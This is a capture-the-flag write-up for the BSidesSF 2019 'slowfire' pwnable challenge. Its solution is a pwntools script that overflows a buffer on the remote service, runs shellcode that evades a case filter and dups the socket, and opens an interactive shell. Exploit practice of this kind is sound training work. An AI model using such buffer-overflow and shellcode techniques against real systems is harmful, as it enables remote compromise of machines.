# **slowfire**

#### tag : pwnable, writeup, BSidesSF-2019-CTF

-----------------------------------------------

#### Description

>Can you pwn it?
>
>nc slowfire-74fa96b8.challenges.bsidessf.net 4141

-----------------------------------------------

#### Solution

```python
from pwn import *
#import shell

context(arch='amd64', os='linux')
r = remote('slowfire-74fa96b8.challenges.bsidessf.net', 4141)

# name's addr
bss = 0x4040c0

# let me execute stack
sh1 = asm(shellcraft.push('rsi'))
sh1 += asm(shellcraft.ret())

# duplicate sock level to standard io level
sh2 = asm(shellcraft.mov('rbp','rdi'))
sh2 += asm(shellcraft.dupsh())

# recover payload
sh2 = list(sh2)
for i in range(len(sh2)):
	if ( ord(sh2[i]) > 64 and ord(sh2[i]) <= 90 ) or ( ord(sh2[i]) > 96 and ord(sh2[i]) <= 122):
		sh2[i] = chr(ord(sh2[i]) ^ 0x20)
sh2 = ''.join(sh2)

# exploit
r.recvn(17)
r.send(sh1+'\x90'*(0x40-len(sh1)))
r.send(sh2+'a'*(1080-len(sh2))+p64(bss))
r.interactive()
```
